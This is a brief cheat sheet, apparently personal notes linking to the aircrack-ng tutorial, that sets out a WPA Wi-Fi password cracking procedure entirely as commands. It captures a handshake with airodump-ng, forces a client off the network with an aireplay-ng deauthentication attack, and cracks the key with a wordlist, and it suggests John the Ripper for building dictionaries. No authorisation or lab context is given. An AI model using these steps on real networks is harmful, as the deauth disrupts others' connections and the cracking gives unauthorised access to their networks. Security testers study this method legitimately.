https://www.aircrack-ng.org/doku.php?id=cracking_wpa

Scan for networks
> `aireplay-ng --test mon0`

Collect auth handshake
> `airodump-ng -c CHANNEL --bssid MAC -w psk mon0`

Try to deauth a client
> `aireplay-ng -0 1 -a AP_MAC -c CLIENT_MAC mon0`

Try to crack the pass
> `aircrack-ng -w password.lst -b AP_MAC psk*.cap`

Uses the contents of password.lst to crack the key. Look into John The Ripper to generate dictionary.
